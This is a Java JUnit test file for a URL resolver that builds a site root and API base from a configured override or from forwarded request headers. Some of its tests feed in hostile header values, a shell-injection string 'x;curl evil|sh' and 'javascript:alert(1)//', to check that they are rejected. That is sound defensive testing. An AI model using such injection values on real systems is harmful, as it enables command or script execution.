package com.eldermoraes.seo;

import io.vertx.core.http.HttpServerRequest;
import io.vertx.ext.web.RoutingContext;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.lang.reflect.Proxy;
import java.util.Map;
import java.util.Optional;

import static org.junit.jupiter.api.Assertions.assertEquals;

/**
 * One meaning for swapi.public-base-url (slice E, 2.11.0): the API base
 * (https://host/api), as the MCP tools and SwapiBaseUrlOverrideTest already read
 * it. The site root is derived from it by dropping a final /api. Plain JUnit: the
 * request is a proxy that answers only the calls the resolver makes.
 */
class PublicSiteUrlResolverTest {

    @Test
    void anApiBaseOverrideGivesTheSiteRootWithoutApi() {
        PublicSiteUrlResolver urls = resolver(Optional.of("https://x.example/api"));
        RoutingContext rc = request(Map.of());
        assertEquals("https://x.example", urls.siteRoot(rc));
        assertEquals("https://x.example/api", urls.apiBase(rc));
        assertEquals("https://x.example/mcp", urls.absoluteUrl(rc, "/mcp"));
    }

    @Test
    void aTrailingSlashOnTheOverrideChangesNothing() {
        PublicSiteUrlResolver urls = resolver(Optional.of("https://x.example/api/"));
        RoutingContext rc = request(Map.of());
        assertEquals("https://x.example", urls.siteRoot(rc));
        assertEquals("https://x.example/api", urls.apiBase(rc));
    }

    // An override without /api (the old reading, site root) still works as a root.
    @Test
    void anOverrideWithoutApiIsTheRoot() {
        PublicSiteUrlResolver urls = resolver(Optional.of("https://x.example/"));
        RoutingContext rc = request(Map.of());
        assertEquals("https://x.example", urls.siteRoot(rc));
        assertEquals("https://x.example/api", urls.apiBase(rc));
    }

    @Test
    void withoutTheOverrideTheRequestHeadersDecide() {
        PublicSiteUrlResolver urls = resolver(Optional.empty());
        RoutingContext rc = request(Map.of("X-Forwarded-Proto", "https", "X-Forwarded-Host", "preview.example"));
        assertEquals("https://preview.example", urls.siteRoot(rc));
        assertEquals("https://preview.example/api", urls.apiBase(rc));
        assertEquals("https://preview.example/docs/mcp", urls.absoluteUrl(rc, "/docs/mcp"));
    }

    @Test
    void withoutHeadersTheRequestItselfDecides() {
        PublicSiteUrlResolver urls = resolver(Optional.empty());
        RoutingContext rc = request(Map.of());
        assertEquals("http://localhost:8081", urls.siteRoot(rc));
    }

    // Defence in depth (2.12.0): the host goes into copied curl/fetch samples, so
    // only a host name or address, with an optional port, is taken from a header.
    @ParameterizedTest
    @ValueSource(strings = {"x;curl evil|sh", "evil example", "evil\"example", "evil'example",
            "evil.example/path", "evil.example:80x", "evil<b>", "evil.example\\x", "user@evil.example"})
    void aHostileForwardedHostFallsBackToTheRequestHost(String hostile) {
        PublicSiteUrlResolver urls = resolver(Optional.empty());
        RoutingContext rc = request(Map.of("X-Forwarded-Host", hostile));
        assertEquals("http://localhost:8081", urls.siteRoot(rc));
    }

    @ParameterizedTest
    @ValueSource(strings = {"a.example", "A-B.example:8443", "127.0.0.1:8099", "[::1]:8099", "[2001:db8::1]"})
    void aPlainHostOrAddressIsTaken(String host) {
        PublicSiteUrlResolver urls = resolver(Optional.empty());
        RoutingContext rc = request(Map.of("X-Forwarded-Host", host));
        assertEquals("http://" + host, urls.siteRoot(rc));
    }

    @Test
    void whenTheRequestHostIsHostileTooTheDefaultIsUsed() {
        PublicSiteUrlResolver urls = resolver(Optional.empty());
        RoutingContext rc = request(Map.of("X-Forwarded-Host", "x;curl evil|sh"), "x;curl evil|sh");
        assertEquals("http://localhost", urls.siteRoot(rc));
    }

    @Test
    void aHostileForwardedProtoFallsBackToTheRequestScheme() {
        PublicSiteUrlResolver urls = resolver(Optional.empty());
        RoutingContext rc = request(Map.of("X-Forwarded-Proto", "javascript:alert(1)//"));
        assertEquals("http://localhost:8081", urls.siteRoot(rc));
    }

    private static PublicSiteUrlResolver resolver(Optional<String> override) {
        PublicSiteUrlResolver urls = new PublicSiteUrlResolver();
        urls.publicBaseUrl = override;
        return urls;
    }

    private static RoutingContext request(Map<String, String> headers) {
        return request(headers, "localhost:8081");
    }

    private static RoutingContext request(Map<String, String> headers, String host) {
        HttpServerRequest request = (HttpServerRequest) Proxy.newProxyInstance(
                PublicSiteUrlResolverTest.class.getClassLoader(), new Class<?>[]{HttpServerRequest.class},
                (proxy, method, args) -> switch (method.getName()) {
                    case "getHeader" -> headers.get(String.valueOf(args[0]));
                    case "scheme" -> "http";
                    case "host" -> host;
                    default -> throw new UnsupportedOperationException(method.getName());
                });
        return (RoutingContext) Proxy.newProxyInstance(
                PublicSiteUrlResolverTest.class.getClassLoader(), new Class<?>[]{RoutingContext.class},
                (proxy, method, args) -> switch (method.getName()) {
                    case "request" -> request;
                    default -> throw new UnsupportedOperationException(method.getName());
                });
    }
}
